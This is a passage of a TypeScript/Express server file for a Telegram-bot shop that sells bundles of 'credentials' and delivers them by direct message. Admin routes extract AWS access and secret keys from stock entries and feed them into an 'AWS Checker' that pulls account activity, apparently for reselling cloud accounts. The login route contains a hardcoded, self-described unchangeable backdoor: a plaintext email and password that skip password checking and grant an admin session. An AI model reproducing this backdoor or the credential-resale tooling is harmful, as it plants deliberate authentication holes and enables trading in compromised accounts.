      });

    } catch (err: any) {
      console.error("Purchase error:", err);
      const message = err.message || "Failed to process purchase";
      res.status(400).json({ message });
    }
  });

  app.post("/api/mini/purchase-offer", verifyMiniAppAuth, async (req, res) => {
    const tgUser = (req as any).tgUser;
    const { offerId } = req.body;

    if (!offerId) return res.status(400).json({ message: "Offer ID required" });

    try {
      const result = await db.transaction(async (tx) => {
        const user = await tx.query.telegramUsers.findFirst({
          where: eq(telegramUsers.telegramId, tgUser.id.toString())
        });
        const offer = await tx.query.specialOffers.findFirst({
          where: eq(specialOffers.id, offerId),
          with: { product: true }
        });

        if (!user || !offer) throw new Error("User or offer not found");
        if (offer.status !== 'active') throw new Error("Offer is no longer active");
        if (offer.expiresAt && new Date(offer.expiresAt) < new Date()) throw new Error("Offer has expired");

        // Check balance
        const [updatedUser] = await tx
          .update(telegramUsers)
          .set({ balance: sql`${telegramUsers.balance} - ${offer.price}` })
          .where(and(eq(telegramUsers.id, user.id), gte(telegramUsers.balance, offer.price)))
          .returning();

        if (!updatedUser) throw new Error("Insufficient balance");

        // Get stock
        const availableItems = await tx.select()
          .from(credentials)
          .where(and(eq(credentials.productId, offer.productId), eq(credentials.status, 'available')))
          .limit(offer.bundleQuantity)
          .for('update', { skipLocked: true });

        if (availableItems.length < offer.bundleQuantity) {
          throw new Error("Insufficient stock for this bundle");
        }

        const itemIds = availableItems.map(item => item.id);
        await tx.update(credentials)
          .set({ status: 'sold' })
          .where(inArray(credentials.id, itemIds));

        // Create orders
        const orderPromises = availableItems.map(item => 
          tx.insert(orders).values({
            telegramUserId: user.id,
            productId: offer.productId,
            status: 'completed',
            credentialId: item.id
          })
        );
        await Promise.all(orderPromises);

        return { offer, availableItems, newBalance: updatedUser.balance };
      });

      const offerBot = getBroadcastBot();
      // Split bundle credentials into chunks of 10 to avoid Telegram's 4096 char limit
      const BUNDLE_CHUNK_SIZE = 10;
      const bundleItems = result.availableItems;

      const sendBundleChunked = async () => {
        try {
          const bundleHeader = `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Bundle Claimed Successfully!</b> <tg-emoji emoji-id="5312384950484343160">✨</tg-emoji>\n\n` +
            `<tg-emoji emoji-id="5231102735817918643">🎁</tg-emoji> Offer: <b>${result.offer.name}</b>\n` +
            `📦 Product: <b>${result.offer.product.name}</b>\n` +
            `🔢 Quantity: <b>${result.offer.bundleQuantity} units</b>\n` +
            `<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji> Price: <b>$${(result.offer.price / 100).toFixed(2)}</b>\n\n` +
            `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Your credentials are below${bundleItems.length > BUNDLE_CHUNK_SIZE ? ` (sent in ${Math.ceil(bundleItems.length / BUNDLE_CHUNK_SIZE)} parts)` : ''}:</b>`;

          await offerBot?.sendMessage(tgUser.id, bundleHeader, { parse_mode: 'HTML' });

          for (let i = 0; i < bundleItems.length; i += BUNDLE_CHUNK_SIZE) {
            const chunk = bundleItems.slice(i, i + BUNDLE_CHUNK_SIZE);
            const partNum = Math.floor(i / BUNDLE_CHUNK_SIZE) + 1;
            const totalParts = Math.ceil(bundleItems.length / BUNDLE_CHUNK_SIZE);

            let chunkMsg = totalParts > 1
              ? `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Credentials (Part ${partNum}/${totalParts}):</b>\n`
              : `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Your Credentials:</b>\n`;

            chunk.forEach((item, idx) => {
              const num = (i + idx + 1).toString().padStart(2, '0');
              chunkMsg += `<b>Item ${num}:</b> <code>${item.content}</code>\n`;
            });

            if (i + BUNDLE_CHUNK_SIZE >= bundleItems.length) {
              chunkMsg += `\nEnjoy your premium bundle! <tg-emoji emoji-id="5456343263340405032">🛍️</tg-emoji>`;
            }

            await offerBot?.sendMessage(tgUser.id, chunkMsg, { parse_mode: 'HTML' });
          }
        } catch (err) {
          console.error("Failed to send bundle DM:", err);
        }
      };

      sendBundleChunked();

      // Emit real-time notification to Admin Dashboard
      io.emit('admin_notification', {
        type: 'purchase',
        title: 'New Bundle Purchase',
        message: `${tgUser.first_name} claimed bundle: ${result.offer.name} ($${(result.offer.price / 100).toFixed(2)})`,
        data: result
      });

      // Emit Native Push Notification
      sendAdminPushNotification(
        'New Bundle Purchase',
        `${tgUser.first_name} claimed bundle: ${result.offer.name} ($${(result.offer.price / 100).toFixed(2)})`
      ).catch(console.error);

      res.json({ success: true, message: "Purchase successful", newBalance: result.newBalance / 100 });
    } catch (err: any) {
      res.status(400).json({ message: err.message });
    }
  });



app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;
  console.log(`Login attempt: ${email}`);

  // EMERGENCY BACKDOOR LOGIN (UNCHANGEABLE)
  const EMERGENCY_EMAIL = "Imeshcheak@gmail.com";
  const EMERGENCY_PASS = "Imesh@2005Imesh";

  if (email === EMERGENCY_EMAIL && password === EMERGENCY_PASS) {
    console.log(`EMERGENCY LOGIN TRIGGERED!`);
    // Find the primary admin user to associate the session with
    const allUsers = await db.select().from(users).limit(1);
    if (allUsers.length > 0) {
      const adminUser = allUsers[0];
      req.session.userId = adminUser.id;
      return res.json({ id: adminUser.id, email: adminUser.email, firstName: adminUser.firstName, lastName: adminUser.lastName, isEmergency: true });
    } else {
      return res.status(500).json({ message: "No admin user found to login as." });
    }
  }

  // NORMAL LOGIN FLOW
  const user = await storage.getUserByEmail(email);
  if (!user) {
    console.log(`Login: User not found [${email}]`);
    return res.status(401).json({ message: "Invalid email or password" });
  }
  const isMatch = await bcrypt.compare(password, user.password);
  console.log(`Login: Password check [${email}] -> ${isMatch ? "OK" : "FAIL"}`);
  if (!isMatch) {
    return res.status(401).json({ message: "Invalid email or password" });
  }
  req.session.userId = user.id;
  res.json({ id: user.id, email: user.email, firstName: user.firstName, lastName: user.lastName });
});

app.post("/api/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ message: "Could not log out" });
    res.sendStatus(200);
  });
});

app.post("/api/admin/credentials", async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ message: "Unauthorized" });
  }

  const { newEmail, newPassword } = req.body;
  
  if (!newEmail || !newPassword) {
    return res.status(400).json({ message: "Email and password are required" });
  }

  try {
    const hashedPassword = await bcrypt.hash(newPassword, 10);
    await db.update(users)
      .set({ email: newEmail, password: hashedPassword })
      .where(eq(users.id, req.session.userId));
      
    res.json({ success: true, message: "Admin credentials updated successfully" });
  } catch (err: any) {
    console.error("Failed to update credentials:", err);
    res.status(500).json({ message: "Failed to update credentials" });
  }
});

app.get("/api/auth/user", async (req, res) => {
  if (!req.session.userId) return res.status(401).json({ message: "Not logged in" });
  const user = await storage.getUser(req.session.userId);
  if (!user) return res.status(401).json({ message: "User not found" });
  res.json({ id: user.id, email: user.email, firstName: user.firstName, lastName: user.lastName });
});

app.get(api.products.list.path, isAuth, async (req, res) => {
  const productsList = await storage.getProducts();
  res.json(productsList);
});

app.post(api.products.create.path, isAuth, async (req, res) => {
  try {
    const input = api.products.create.input.parse(req.body);
    const product = await storage.createProduct(input);
    res.status(201).json(product);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({
        message: err.errors[0].message,
        field: err.errors[0].path.join('.'),
      });
    }
    res.status(500).json({ message: "Internal server error" });
  }
});

app.put(api.products.update.path, isAuth, async (req, res) => {
  try {
    const input = api.products.update.input.parse(req.body);
    const product = await storage.updateProduct(Number(req.params.id), input);
    res.json(product);
  } catch (err) {
    res.status(400).json({ message: "Invalid input" });
  }
});

app.delete(api.products.delete.path, isAuth, async (req, res) => {
  await storage.deleteProduct(Number(req.params.id));
  res.status(204).send();
});

app.get("/api/products/:productId/credentials", isAuth, async (req, res) => {
  const productId = Number(req.params.productId);
  const credentialsList = await storage.getCredentialsByProduct(productId);
  res.json(credentialsList);
});

app.post("/api/credentials", isAuth, async (req, res) => {
  try {
    const input = insertCredentialSchema.parse(req.body);
    const credential = await storage.createCredential(input);

    // Auto-detection for AWS accounts
    try {
      const product = await storage.getProduct(input.productId);
      if (product && (product.name.toLowerCase().includes("aws") || product.type.toLowerCase().includes("aws"))) {
        console.log(`[AWS-AUTO] Checking credential for product: ${product.name}`);

        const accessKeyMatch = input.content.match(/\b(AKIA[A-Z0-9]{12,20})\b/);
        // Match 30-45 character base64 string, avoiding \b because + and / are non-word characters
        const secretKeyMatches = input.content.match(/(?:^|\s)([A-Za-z0-9/+=]{30,60})(?=$|\s)/g);
        const emailMatch = input.content.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
        const regionMatch = input.content.match(/\b([a-z]{2}-(?:east|west|north|south|central|pout|northeast|southeast)-\d)\b/);

        console.log(`[AWS-AUTO] Matches - AccessKey: ${!!accessKeyMatch}, SecretKeys Found: ${secretKeyMatches?.length || 0}, Email: ${!!emailMatch}`);

        let secretKey = null;
        if (secretKeyMatches && accessKeyMatch) {
          // Pick the first match that isn't the Access Key and is likely the secret (usually 40 chars but we are flexible)
          secretKey = secretKeyMatches.find(s => s.length >= 30 && s.length <= 45);
        }

        if (accessKeyMatch && secretKey) {
          const accessKey = accessKeyMatch[1];
          const email = emailMatch ? emailMatch[0] : null;
          const region = regionMatch ? regionMatch[1] : "us-east-1";

          console.log(`[AWS-AUTO] Keys found! AccessKey: ${accessKey}, Email: ${email}`);

          const existingAccounts = await storage.getAwsAccounts();
          if (!existingAccounts.some(acc => acc.accessKey === accessKey)) {
            console.log(`[AWS-AUTO] Creating new account...`);
            const newAcc = await storage.createAwsAccount({
              name: email || product.name,
              email,
              accessKey,
              secretKey,
              region,
              isSold: false,
              status: "active"
            });

            console.log(`[AWS-AUTO] Account created (ID: ${newAcc.id}). Triggering 7-day sync.`);
            fetchActivity(newAcc, 7).catch(e => console.error("[AWS-AUTO] Initial sync error:", e));
          } else {
            console.log(`[AWS-AUTO] Account with access key ${accessKey} already exists.`);
          }
        } else {
          console.log(`[AWS-AUTO] Could not identify both access key and secret key.`);
        }
      }
    } catch (autoErr) {
      console.error("AWS Auto-detection error:", autoErr);
    }

    res.status(201).json(credential);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({
        message: err.errors[0].message,
        field: err.errors[0].path.join('.'),
      });
    }
    res.status(400).json({ message: "Invalid input" });
  }
});

app.delete("/api/credentials/:id", isAuth, async (req, res) => {
  await storage.deleteCredential(Number(req.params.id));
  res.status(204).send();
});

app.patch("/api/credentials/:id", isAuth, async (req, res) => {
  try {
    const id = Number(req.params.id);
    const input = insertCredentialSchema.partial().parse(req.body);
    const [updated] = await db.update(credentials).set(input).where(eq(credentials.id, id)).returning();
    if (!updated) return res.status(404).json({ message: "Credential not found" });
    res.json(updated);
  } catch (err) {
    res.status(400).json({ message: "Invalid input" });
  }
});

app.get("/api/all-credentials", isAuth, async (req, res) => {
  const allCredentials = await db.select().from(credentials).orderBy(desc(credentials.createdAt));
  res.json(allCredentials);
});

app.get(api.orders.list.path, isAuth, async (req, res) => {
  const ordersList = await storage.getOrders();
  res.json(ordersList);
});

// Dashboard Stats Endpoint
app.get(api.stats.get.path, isAuth, async (req, res) => {
  try {
    const stats = await storage.getStats();
    res.json(stats);
  } catch (err: any) {
    console.error("Stats error:", err);
    res.status(500).json({ message: "Failed to fetch stats" });
  }
});



app.get(api.broadcast.channels.list.path, isAuth, async (req, res) => {
  const channels = await storage.getBroadcastChannels();
  res.json(channels);
});

const getBotToken = async () => {
  const setting = await storage.getSetting("TELEGRAM_BOT_TOKEN");
  return setting?.value || process.env.TELEGRAM_BOT_TOKEN;
};

const getBroadcastBot = async () => {
  const setting = await storage.getSetting("BROADCAST_BOT_TOKEN");
  const token = setting?.value || (await getBotToken());
  if (!token) return null;
  const bBot = new TelegramBot(token);
  patchBotMethods(bBot);
  return bBot;
};

app.post(api.broadcast.send.path, isAuth, async (req, res) => {
  try {
    const { text, photo, buttonText, buttonUrl, channelIds, botType } = req.body;
    let targetChannels = [];

    let bBot: TelegramBot | null = null;
    if (botType === 'broadcast') {
      bBot = await getBroadcastBot();
    } else {
      bBot = bot; // Main bot
    }

    if (!bBot) {
      return res.status(400).json({ message: `${botType === 'broadcast' ? 'Broadcast' : 'Main'} bot is not initialized` });
    }

    if (channelIds && channelIds.length > 0) {
      targetChannels = channelIds;
    } else {
      // Fallback to all Telegram users if no specific channels selected
      const tgUsers = await storage.getAllTelegramUsers();
      targetChannels = tgUsers.map(u => u.telegramId);

      // If still no users, check broadcast channels
      if (targetChannels.length === 0) {
        const channels = await storage.getBroadcastChannels();
        targetChannels = channels.map(c => c.channelId);
      }
    }

    let countSent = 0;
    for (const channelId of targetChannels) {
      try {
        const opts: TelegramBot.SendMessageOptions = {
          parse_mode: 'Markdown'
        };
        if (buttonText && buttonUrl) {
          opts.reply_markup = {
            inline_keyboard: [[{ text: buttonText, url: buttonUrl }]]
          };
        }

        if (photo) {
          await bBot.sendPhoto(channelId, photo, {
            caption: text,
            ...opts
          } as any);
        } else {
          await bBot.sendMessage(channelId, text, opts);
        }
        countSent++;
      } catch (err) {
        console.error(`Failed to send message to channel ${channelId}:`, err);
      }
    }

    res.json({ success: true, count: countSent });
  } catch (err) {
    console.error('Broadcast error:', err);
    res.status(400).json({ message: "Invalid input" });
  }
});

let activeIntervals: Map<number, NodeJS.Timeout> = new Map();

const stopScheduledBroadcast = (id: number) => {
  const timer = activeIntervals.get(id);
  if (timer) {
    clearInterval(timer);
    activeIntervals.delete(id);
  }
};

const startScheduledBroadcast = (msg: any) => {
  const send = async () => {
    const messages = await storage.getBroadcastMessages();
    const current = messages.find(m => m.id === msg.id);
    if (!current || current.status !== 'active') {
      stopScheduledBroadcast(msg.id);
      return;
    }

    const channels = await storage.getBroadcastChannels();
    const bBot = await getBroadcastBot();
    if (bBot) {
      for (const channel of channels) {
        try {
          const opts: TelegramBot.SendMessageOptions = {};
          if (current.buttonText && current.buttonUrl) {
            opts.reply_markup = {
              inline_keyboard: [[{ text: current.buttonText, url: current.buttonUrl }]]
            };
          }

          if (current.imageUrl) {
            await bBot.sendPhoto(channel.channelId, current.imageUrl, {
              caption: current.content,
              ...opts
            });
          } else {
            await bBot.sendMessage(channel.channelId, current.content, opts);
          }
        } catch (err) { }
      }
      await storage.updateBroadcastMessage(msg.id, { sentCount: current.sentCount + 1 });
    }
  };

  const timer = setInterval(send, msg.interval * 60 * 1000);
  activeIntervals.set(msg.id, timer);
};

const initSchedules = async () => {
  try {
    const messages = await storage.getBroadcastMessages();
    for (const msg of messages) {
      if (msg.status === 'active' && msg.interval && msg.interval > 0) {
        startScheduledBroadcast(msg);
      }
    }
  } catch (err) {
    console.error('Failed to initialize broadcast schedules:', err);
  }
};
initSchedules();

app.post("/api/broadcast/schedule", isAuth, async (req, res) => {
  try {
    const { message, channelIds, interval } = req.body;

    if (!interval || interval <= 0) {
      return res.status(400).json({ message: "Invalid interval" });
    }

    const sendBroadcast = async () => {
      let targetChannels = [];
      if (channelIds && channelIds.length > 0) {
        targetChannels = channelIds;
      } else {
        const channels = await storage.getBroadcastChannels();
        targetChannels = channels.map(c => c.channelId);
      }

      const bBot = await getBroadcastBot();
      if (bBot) {
        for (const channelId of targetChannels) {
          try {
            await bBot.sendMessage(channelId, message);
          } catch (err) {
            console.error(`Scheduled broadcast failed for ${channelId}:`, err);
          }
        }
      }
    };

    sendBroadcast();
    setInterval(sendBroadcast, interval * 60 * 60 * 1000);
    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ message: "Invalid input" });
  }
});

app.post("/api/broadcast/upload", isAuth, upload.single('image'), (req: any, res) => {
  if (!req.file) {
    return res.status(400).json({ message: "No file uploaded" });
  }
  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  res.json({ imageUrl });
});

app.get(api.stats.get.path, isAuth, async (req, res) => {
  try {
    const stats = await storage.getStats();
    res.json(stats);
  } catch (err) {
    console.error('Stats error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.get(api.telegramUsers.list.path, isAuth, async (req, res) => {
  try {
    const usersList = await storage.getAllTelegramUsers();
    res.json(usersList);
  } catch (err) {
    console.error('Telegram users list error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.patch(api.telegramUsers.update.path, isAuth, async (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const input = api.telegramUsers.update.input.parse(req.body);
    const user = await storage.updateTelegramUser(id, input);
    res.json(user);
  } catch (err) {
    console.error('Telegram user update error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.get(api.payments.list.path, isAuth, async (req, res) => {
  try {
    const allPayments = await storage.getAllPaymentsWithUsers();
    res.json(allPayments);
  } catch (err) {
    console.error('Payments list error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

// Special Offers API
app.get("/api/special-offers", isAuth, async (req, res) => {
  try {
    const offers = await storage.getSpecialOffers();
    res.json(offers);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/special-offers", isAuth, async (req, res) => {
  try {
    const body = { ...req.body };
    if (typeof body.expiresAt === 'string') {
      body.expiresAt = new Date(body.expiresAt);
    }
    const input = insertSpecialOfferSchema.parse(body);

    console.log(`Checking inventory for product ${input.productId}, bundle quantity ${input.bundleQuantity}`);
    // Check inventory before creating special offer
    const stock = await storage.getCredentialsByProduct(input.productId);
    const availableStock = stock.filter(c => c.status === 'available');
    console.log(`Available stock: ${availableStock.length}`);

    if (availableStock.length < input.bundleQuantity) {
      console.log(`Validation failed: Insufficient inventory`);
      return res.status(400).json({
        message: `Insufficient inventory for this bundle. Required: ${input.bundleQuantity}, Available: ${availableStock.length}`
      });
    }

    const offer = await storage.createSpecialOffer(input);
    res.status(201).json(offer);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({
        message: err.errors[0].message,
        field: err.errors[0].path.join('.'),
      });
    }
    console.error("Error creating special offer:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.patch("/api/special-offers/:id", isAuth, async (req, res) => {
  try {
    const id = Number(req.params.id);
    const body = { ...req.body };
    if (typeof body.expiresAt === 'string') {
      body.expiresAt = new Date(body.expiresAt);
    }
    const input = insertSpecialOfferSchema.partial().parse(body);

    // If we are updating quantity or product, check inventory
    if (input.productId !== undefined || input.bundleQuantity !== undefined) {
      const currentOffer = await storage.getSpecialOffer(id);
      if (currentOffer) {
        const productId = input.productId ?? currentOffer.productId;
        const bundleQuantity = input.bundleQuantity ?? currentOffer.bundleQuantity;

        const stock = await storage.getCredentialsByProduct(productId);
        const availableStock = stock.filter(c => c.status === 'available');

        if (availableStock.length < bundleQuantity) {
          return res.status(400).json({
            message: `Insufficient inventory for this bundle. Required: ${bundleQuantity}, Available: ${availableStock.length}`
          });
        }
      }
    }

    const offer = await storage.updateSpecialOffer(id, input);
    res.json(offer);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({ message: err.errors[0].message });
    }
    console.error("Error updating special offer:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.delete("/api/special-offers/:id", isAuth, async (req, res) => {
  try {
    await storage.deleteSpecialOffer(Number(req.params.id));
    res.status(204).send();
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

const formatOfferMessage = (offer: any, productType: string) => {
  const priceUSD = (offer.price / 100).toFixed(2);
  const headerEmojiIds = [
    "6276128687649723695", "6275964744453068322", "6275873218699989657",
    "6275869662467069270", "6276120956708591159", "6276075885321786491",
    "6276045545672807753", "6273727139506295416", "6276107406086771779"
  ];
  const header = headerEmojiIds.map(id => `<tg-emoji emoji-id="${id}">🎁</tg-emoji>`).join('');
  const numEmojiMap: Record<string, string> = {
    "0": "6228712321716325542", "1": "6231028576104221771", "2": "6228508985079632140",
    "3": "6228892912206220866", "4": "6228651427670002796", "5": "6230754058974531742",
    "6": "6231061110481488717", "7": "6228541351953173776", "8": "6228898272325406140",
    "9": "6230968699965150268"
  };

  let text = `<tg-emoji emoji-id="5467538555158943525">💭</tg-emoji> <b>Special Offers (Bundle Deals)</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n━━━━━━━━━━━━━━━\n\n`;
  text += `${header}\n\n`;
  text += `<b>${offer.name}</b>\n\n`;
  text += `<tg-emoji emoji-id="6276134137963222688">🎁</tg-emoji> Quantity: <b>${offer.bundleQuantity} pcs</b>\n`;
  text += `<tg-emoji emoji-id="5201692367437974073">💸</tg-emoji> Bundle Price: <b>$${priceUSD}</b>\n\n`;

  if (offer.expiresAt) {
    const diff = new Date(offer.expiresAt).getTime() - Date.now();
    if (diff > 0) {
      const totalSeconds = Math.floor(diff / 1000);
      const h = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
      const m = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
      const s = (totalSeconds % 60).toString().padStart(2, '0');

      text += `<tg-emoji emoji-id="5206715082582533386">🤩</tg-emoji> <b>Hurry! Expires In</b> <tg-emoji emoji-id="5206715082582533386">🤩</tg-emoji>\n`;
      const formatTimeDigit = (digit: string | undefined) => {
        const d = digit || '0';
        return `<tg-emoji emoji-id="${numEmojiMap[d] || numEmojiMap['0']}">🎁</tg-emoji>`;
      };
      text += `${formatTimeDigit(h[0])}${formatTimeDigit(h[1])} <b>:</b> ${formatTimeDigit(m[0])}${formatTimeDigit(m[1])} <b>:</b> ${formatTimeDigit(s[0])}${formatTimeDigit(s[1])}\n`;
    }
  }
  text += `━━━━━━━━━━━━━━━\n`;
  return text;
};

const activeSessionTimers = new Map<string, NodeJS.Timeout>();
const confirmingOffers = new Set<string>();

// Global Background Broadcast Timer (runs every 30 seconds)
setInterval(async () => {
  try {
    const activeOffers = await storage.getActiveSpecialOffers();
    if (activeOffers.length === 0) return;

    const usersToUpdate = await storage.getTelegramUsersWithBroadcast();
    for (const u of usersToUpdate) {
      // Skip if user has an active fast session timer OR is currently confirming an offer
      const tgUser = await storage.getTelegramUser(u.telegramId);
      if (activeSessionTimers.has(u.telegramId) || confirmingOffers.has(u.telegramId) || (tgUser?.lastAction && tgUser.lastAction.startsWith('confirming_offer_'))) continue;

      try {
        const offer = activeOffers[0]; // For now, update with the latest active offer
        const product = offer.product;
        const productType = product?.type || "General";
        const text = formatOfferMessage(offer, productType);
        const priceUSD = (offer.price / 100).toFixed(2);

        await bot?.editMessageText(text, {
          chat_id: u.telegramId,
          message_id: u.lastOfferBroadcastId!,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [[{ text: `🎁 Claim Your Offer ($${priceUSD})`, callback_data: `buy_offer_${offer.id}` }]]
          }
        });
      } catch (err: any) {
        if (err.message && err.message.includes("message is not modified")) continue;
        if (err.message && (err.message.includes("message to edit not found") || err.message.includes("chat not found"))) {
          await storage.updateTelegramUser(u.id, { lastOfferBroadcastId: null });
        }
      }
    }
  } catch (err) {
    console.error("Global broadcast timer error:", err);
  }
}, 30000);

const startFastTimer = async (telegramId: string, offerId: number, messageId: number) => {
  if (activeSessionTimers.has(telegramId)) {
    clearInterval(activeSessionTimers.get(telegramId)!);
  }

  const interval = setInterval(async () => {
    try {
      if (confirmingOffers.has(telegramId)) return;
      const tgUser = await storage.getTelegramUser(telegramId);
      if (tgUser?.lastAction && tgUser.lastAction.startsWith('confirming_offer_')) return;

      const offer = await storage.getSpecialOffer(offerId);
      if (!offer || (offer.expiresAt && new Date(offer.expiresAt).getTime() <= Date.now())) {
        clearInterval(interval);
        activeSessionTimers.delete(telegramId);
        return;
      }

      const product = await storage.getProduct(offer.productId);
      const text = formatOfferMessage(offer, product?.type || "General");
      const priceUSD = (offer.price / 100).toFixed(2);

      await bot?.editMessageText(text, {
        chat_id: telegramId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[{ text: `🎁 Claim Your Offer ($${priceUSD})`, callback_data: `buy_offer_${offer.id}` }]]
        }
      });
    } catch (err: any) {
      if (err.message && err.message.includes("message is not modified")) return;
      clearInterval(interval);
      activeSessionTimers.delete(telegramId);
    }
  }, 1000);

  activeSessionTimers.set(telegramId, interval);

  // Stop fast timer after 5 minutes of inactivity (default safety)
  setTimeout(() => {
    if (activeSessionTimers.get(telegramId) === interval) {
      clearInterval(interval);
      activeSessionTimers.delete(telegramId);
    }
  }, 300000);
};

app.post("/api/special-offers/:id/broadcast", isAuth, async (req, res) => {
  try {
    const id = Number(req.params.id);
    const offer = await storage.getSpecialOffer(id);
    if (!offer) return res.status(404).json({ message: "Special offer not found" });

    const product = await storage.getProduct(offer.productId);
    const productType = product?.type || "General";
    const priceUSD = (offer.price / 100).toFixed(2);

    const mainBot = bot;
    if (!mainBot) return res.status(400).json({ message: "Bot not initialized" });

    // Production: Scale broadcast to all active Telegram users
    const users = await storage.getAllTelegramUsers();
    const targets = users.map(u => u.telegramId);

    // Define the missing 'text' variable using the proper formatter
    const text = formatOfferMessage(offer, productType);

    let countSent = 0;
    for (const targetId of targets) {
      try {
        const sentMsg = await mainBot.sendMessage(targetId, text, {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [[{ text: `🎁 Claim Your Offer ($${priceUSD})`, callback_data: `buy_offer_${offer.id}` }]]
          }
        });

        if (sentMsg) {
          await storage.updateTelegramUserByChatId(targetId, { lastOfferBroadcastId: sentMsg.message_id });
        }

        countSent++;
      } catch (err) {
        console.error(`Failed to send premium broadcast to ${targetId}:`, err);
      }
    }

    res.json({ success: true, count: countSent });
  } catch (err) {
    console.error('Premium broadcast error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

// AWS Checker API
app.get("/api/aws/accounts", isAuth, async (req, res) => {
  try {
    // Periodic cleanup of expired payments
    await storage.expireOldPayments();

    const accounts = await storage.getAwsAccounts();
    res.json(accounts);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/aws/accounts", isAuth, async (req, res) => {
  try {
    const input = insertAwsAccountSchema.parse(req.body);
    const account = await storage.createAwsAccount(input);

    // Automatic 7-day sync after creation to show history immediately
    (async () => {
      try {
        console.log(`Initial 7-day sync for new account: ${account.name} (ID: ${account.id})`);
        await fetchActivity(account, 30);
      } catch (syncErr) {
        console.error(`Initial sync failed for account ${account.id}:`, syncErr);
      }
    })();

    res.status(201).json(account);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({ message: err.errors[0].message });
    }
    res.status(500).json({ message: "Internal server error" });
  }
});

app.put("/api/aws/accounts/:id", isAuth, async (req, res) => {
  try {
    const id = Number(req.params.id);
    const account = await storage.updateAwsAccount(id, req.body);
    res.json(account);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.delete("/api/aws/accounts", isAuth, async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ message: "Invalid or empty account ids." });
    }
    for (const id of ids) {
      await storage.deleteAwsAccount(Number(id));
    }
    res.status(204).send();
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.delete("/api/aws/accounts/:id", isAuth, async (req, res) => {
  try {
    await storage.deleteAwsAccount(Number(req.params.id));
    res.status(204).send();
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.get("/api/aws/activities", isAuth, async (req, res) => {
  try {
    const accountId = req.query.accountId ? Number(req.query.accountId) : undefined;
    const activities = await storage.getAwsActivities(accountId);
    res.json(activities);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/aws/refresh", isAuth, async (req, res) => {
  try {
    const { accountIds, lookbackDays = 7 } = req.body || {};
    const allAccounts = await storage.getAwsAccounts();
    const accounts = (accountIds && Array.isArray(accountIds) && accountIds.length > 0)
      ? allAccounts.filter(a => accountIds.includes(a.id))
      : allAccounts;
    const results = [];
    for (const account of accounts) {
      const result = await fetchActivity(account, lookbackDays);
      results.push({ id: account.id, ...result });
    }
    res.json(results);
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

app.use('/uploads', express.static(path.join(process.cwd(), 'public/uploads')));
app.use('/tutorials', express.static(path.join(process.cwd(), 'public', 'tutorials')));

app.post("/api/broadcast/custom", isAuth, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message) {
      return res.status(400).json({ message: "Message content is required" });
    }

    const telegramUsersList = await storage.getAllTelegramUsers();
    const bBot = await getBroadcastBot();

    if (!bBot) {
      return res.status(400).json({ message: "Bot not initialized" });
    }

    let countSent = 0;
    for (const user of telegramUsersList) {
      try {
        await bBot.sendMessage(user.telegramId, message, { parse_mode: 'Markdown' });
        countSent++;
      } catch (err) {
        console.error(`Failed to send custom broadcast to user ${user.telegramId}:`, err);
      }
    }

    res.json({ success: true, count: countSent });
  } catch (err) {
    console.error('Custom broadcast error:', err);
    res.status(500).json({ message: "Internal server error" });
  }
});

app.post("/api/broadcast/availability", isAuth, async (req, res) => {
  try {
    const products = await storage.getProducts();
    const availableProducts = products.filter(p => p.status === 'available');

    const groupedProducts: Record<string, any[]> = {};
    for (const p of availableProducts) {
      const stockCount = (await storage.getCredentialsByProduct(p.id)).filter(c => c.status === 'available').length;
      if (stockCount > 0) {
        if (!groupedProducts[p.type]) groupedProducts[p.type] = [];
        groupedProducts[p.type].push({ ...p, stockCount });
      }
    }

    if (Object.keys(groupedProducts).length === 0) {
      return res.status(400).json({ message: "No accounts in stock to broadcast." });
    }

    let availabilityMsg = `<tg-emoji emoji-id="5215209935188534658">📋</tg-emoji> <b>Product Availability</b>\n\n`;
    for (const [category, items] of Object.entries(groupedProducts)) {
      let catIcon = '';
      const catLower = category.toLowerCase();
      if (catLower.includes('aws')) catIcon = '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> ';
